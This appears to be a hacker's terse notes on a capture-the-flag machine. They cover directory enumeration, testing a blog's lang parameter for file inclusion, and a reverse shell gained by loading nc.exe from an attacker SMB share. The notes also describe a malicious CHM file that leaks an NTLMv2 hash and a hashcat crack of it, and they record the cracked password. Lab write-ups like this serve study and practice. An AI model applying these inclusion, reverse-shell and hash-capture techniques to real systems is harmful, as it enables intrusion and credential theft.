/images/ (Status: 403)
/blog/ (Status: 200)
/user/ (Status: 302)
/css/ (Status: 403)
/js/ (Status: 403)

/user/ => need to login.
registered a account=> "under construction"
also used sqlmap -r post.req to test the registration => nope

/blog/ =>
find links like: /blog?lang=blog-en.php
LFI? => tried C:\windows\win.in => nothing
RFI => no
SQLi => sqlmap => no
tried /blog/?lang=css/style.css => can read a file. but cannot read ../user/login.php
tried wfuzz => nothing.

(get hint) not sure why, but \windows\win.ini works, just don't include C:\
(get hint) impacket-smbserver doesn't work. Try linux one.
guess, maybe the target blocks http requests
create a rev.exe and put \\xxxx\tester\rev.exe in command, failed!
But somehow nc.exe will work, maybe AV thing.
=> got foothold

Hi Chris,
Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.

(read the answer, because my computer the html helper workstation cannot compile due to "cannot open xxx.chm". I used the an XP VM machine to fix this.)
use smb ntmlv2 hash method, created an evil chm that includes an image to my smb share. => got hash.
hashcat -m 5600 => butterfly!#1
